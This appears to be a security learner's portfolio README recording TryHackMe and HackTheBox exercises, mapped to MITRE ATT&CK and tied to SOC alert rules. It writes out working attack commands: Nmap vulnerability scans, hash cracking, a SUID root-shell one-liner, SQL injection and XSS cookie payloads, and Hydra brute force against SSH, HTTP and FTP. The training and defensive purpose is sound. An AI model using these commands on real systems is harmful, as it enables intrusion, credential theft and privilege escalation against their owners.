# Offensive Security Skills Lab — TryHackMe & HackTheBox
> **Focus:** Red Team Fundamentals | **Duration:** 2024 – Present  
> **Platforms:** TryHackMe (THM) · HackTheBox (HTB)

---

## Purpose
This lab documents hands-on offensive security exercises completed on THM and HTB.  
Each technique maps to a MITRE ATT&CK tactic — understanding attacker methods is essential for  
effective SOC alert triage and threat detection.

---

## Skills Covered

| Domain                   | Tools Used                            | THM/HTB Rooms                     |
|--------------------------|---------------------------------------|-----------------------------------|
| Network Enumeration      | Nmap, Netcat                          | Nmap Room, Network Services       |
| Hash Cracking            | Hashcat, John the Ripper              | John The Ripper Room, Crackthehash|
| Linux Privilege Escalation | LinPEAS, SUID exploitation          | Linux PrivEsc, Skynet             |
| Web Exploitation         | Burp Suite, SQLMap, Gobuster          | OWASP Top 10, SQL Injection       |
| Brute Force              | Hydra                                 | Hydra Room, Mr Robot              |
| Password Attacks         | Hashcat (MD5, NTLM, bcrypt)           | Crackthehash, Password Attacks    |

---

## Lab Walkthroughs

### 1. Network Enumeration — Nmap
**Objective:** Map an unknown network, identify open ports and services.

```bash
# Full scan with service/version detection
nmap -sV -sC -oN scan_results.txt <target_ip>

# UDP scan for hidden services
nmap -sU --top-ports 100 <target_ip>

# Script scan for vulnerabilities
nmap --script vuln <target_ip>
```

**Findings (THM Network Services room):**
- Port 21 (FTP) — Anonymous login enabled → directory traversal possible
- Port 22 (SSH) — OpenSSH 7.2p2 → vulnerable to username enumeration
- Port 80 (HTTP) → Nikto scan revealed directory listing enabled

**MITRE ATT&CK:** T1046 – Network Service Scanning

---

### 2. Hash Cracking — John the Ripper & Hashcat
**Objective:** Crack password hashes extracted from `/etc/shadow` and NTLM dumps.

```bash
# Identify hash type
hashid hash.txt

# Crack MD5 with rockyou
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Crack NTLM (Windows)
hashcat -m 1000 ntlm_hash.txt /usr/share/wordlists/rockyou.txt

# John with auto-detect
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Key Learning:** MD5 cracked in < 2 seconds with rockyou. NTLM (no salt) equally weak.  
This demonstrates why password hashing without salting + bcrypt is insufficient for defence.

**MITRE ATT&CK:** T1110.002 – Password Cracking

---

### 3. Linux Privilege Escalation
**Objective:** Escalate from low-privilege shell to root.

```bash
# Run LinPEAS for automated enumeration
./linpeas.sh | tee priv_esc_output.txt

# Check SUID binaries (classic privesc)
find / -perm -4000 2>/dev/null

# Exploit misconfigured SUID (e.g. find binary)
find . -exec /bin/sh -p \; -quit

# Check sudo rights
sudo -l
```

**Findings (THM Linux PrivEsc room):**
- `/usr/bin/python3` had SUID bit set → spawned root shell via `os.setuid(0)`
- Cron job running as root with world-writable script → script injection → root access

**MITRE ATT&CK:** T1548.001 – Setuid and Setgid

---

### 4. Web Exploitation — OWASP Top 10
**Objective:** Exploit common web vulnerabilities on intentionally vulnerable apps.

```bash
# Directory brute force
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/medium.txt

# SQL Injection test (manual)
' OR 1=1 --
' UNION SELECT null, username, password FROM users --

# Automated SQLi
sqlmap -u "http://<target>/login.php?id=1" --dbs

# XSS test
<script>alert(document.cookie)</script>
```

**Findings (THM OWASP Top 10 room):**
- SQLi on login page → extracted admin credentials from DB
- Stored XSS → cookie hijacking demonstrated
- IDOR on `/profile?id=1` → changed to `id=2` → accessed another user's data

**MITRE ATT&CK:** T1190 – Exploit Public-Facing Application

---

### 5. Brute Force — Hydra
**Objective:** Credential attack on SSH and HTTP login forms.

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>

# HTTP POST form brute force
hydra -l admin -P rockyou.txt <target_ip> http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://<target_ip>
```

**Result:** SSH access obtained with `admin:password123` — highlights weak credential risk.  
This directly informs SOC alert rule: flag >5 failed SSH logins from same IP within 60 seconds.

**MITRE ATT&CK:** T1110.001 – Password Guessing

---

## SOC Perspective — Why Offensive Skills Matter for Defence

| Offensive Technique       | What a SOC Analyst Should Alert On                |
|---------------------------|--------------------------------------------------|
| Nmap scanning             | Port sweep from single IP → Event ID 5156/firewall logs |
| Hydra SSH brute force     | >5 failed logins (Event ID 4625) in 60s          |
| SQLi attempt              | WAF logs, unusual DB query patterns               |
| SUID exploitation         | Privilege change Event ID 4672                   |
| Reverse shell (port 4444) | Outbound connection on non-standard port          |

> Understanding how attacks work is what separates a reactive SOC analyst from a proactive one.

---

## Platforms & Progress

- **TryHackMe:** Learning Paths completed — Pre-Security, SOC Level 1, Linux Fundamentals
- **HackTheBox:** Starting Point machines — Meow, Fawn, Dancing, Redeemer completed

---

## Tools Reference

| Tool             | Purpose                          |
|------------------|----------------------------------|
| Nmap             | Network scanning & enumeration   |
| Hydra            | Credential brute forcing         |
| John the Ripper  | Offline password cracking        |
| Hashcat          | GPU-accelerated hash cracking    |
| Gobuster         | Web directory enumeration        |
| Burp Suite       | Web proxy & manual testing       |
| LinPEAS          | Linux privilege escalation enum  |
| SQLMap           | Automated SQL injection          |
